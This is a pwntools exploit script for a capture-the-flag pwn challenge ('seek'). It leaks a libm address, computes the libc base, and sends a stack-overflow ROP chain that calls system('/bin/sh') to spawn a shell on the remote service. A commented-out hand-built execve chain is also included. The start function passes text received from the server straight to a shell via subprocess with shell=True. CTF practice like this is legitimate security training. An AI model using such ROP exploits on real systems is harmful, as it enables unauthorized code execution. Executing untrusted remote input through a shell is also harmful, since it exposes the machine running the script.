#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import os, sys, subprocess

os.chdir(os.path.dirname(os.path.abspath(__file__)))

exe = context.binary = ELF('./chal',checksec=False)
libm = ELF('libm-2.27.so')
libc = ELF('libc-2.27.so')

host = args.HOST or 'seek.chal.irisc.tf'
port = int(args.PORT or 10001)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path], *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        io = start_remote(argv, *a, **kw)
        io.recvuntil(b'with:\n').decode()
        out = subprocess.check_output(io.recvline(), shell=True).strip()
        #a = input('ok ?')
        io.sendline(out)
        return io

# context.terminal = ['tmux', 'splitw', '-h']
context.terminal = ['xfce4-terminal','-e']
gdbscript = '''
tbreak main
b *main+159
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()
io.recvuntil(b': 0x')
a1 = int(io.recv(12),16)
libm.address = a1-libm.sym['fabs']
log.success(f'{a1 = :x} {libm.address = :x}')

OFFSET = len('0000111122223333')


POP_RDI = libm.address + 0x000000000000bc37
POP_RSI = libm.address + 0x00000000000289d3
POP_RAX = libm.address + 0x000000000008c2c5
POP_RDX = libm.address + 0x000000000004c5c2
MOV = libm.address + 0x00000000000805b8 # mov qword ptr [rsi + rax*8 + 8], rdx ; pop rbx ; ret
WRITABLE = libm.address + 0x0000000039d000 + 0x10
SYSCALL = libm.address + 0x0000000000003f39
RET = libm.address + 0x000000000008c2c6

# execve('/bin/bash', 0, 0)
# RAX = 59
# RDI = "/bin/sh"
# RSI = 0
# RDX = 0
# p = b'A' * OFFSET
# p += p64(RET)
# p += p64(POP_RAX) + p64(0)
# p += p64(POP_RSI) + p64(WRITABLE)
# p += p64(POP_RDX) + b'/bin/sh\0'
# p += p64(MOV) + p64(0xc0febabe)

# p += p64(POP_RAX) + p64(59)
# p += p64(POP_RDI) + p64(WRITABLE+8)
# p += p64(POP_RSI) + p64(0)
# p += p64(POP_RDX) + p64(0)
# p += p64(SYSCALL)

libc.address = libm.address - 0x400000

log.success(f'{libc.address = :x}')

rop = ROP(libc)
rop.raw(rop.ret)
rop.system(next(libc.search(b'/bin/sh\0')))
print(rop.dump())

p = b'A' * OFFSET
p += rop.chain()

io.sendlineafter(b'yours? ',p)

if '-i' in sys.argv or args.GDB:
    io.interactive()

